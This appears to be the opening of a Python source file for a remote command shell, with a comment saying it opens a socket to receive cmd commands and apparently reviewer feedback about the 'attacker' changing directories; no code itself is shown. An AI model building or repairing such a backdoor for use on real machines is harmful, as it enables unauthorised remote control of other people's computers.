# This program open a socket  on the computer to, recieves cmd commands

"""
* The program is written great but it fails when the attacker wants to change a directory plz fix â™¥                [V] Fixed.
* You have an unused constat "IP".                                                                                 [V] It was used.
* Really loved the command line.                                                                                   [V] Thank you.
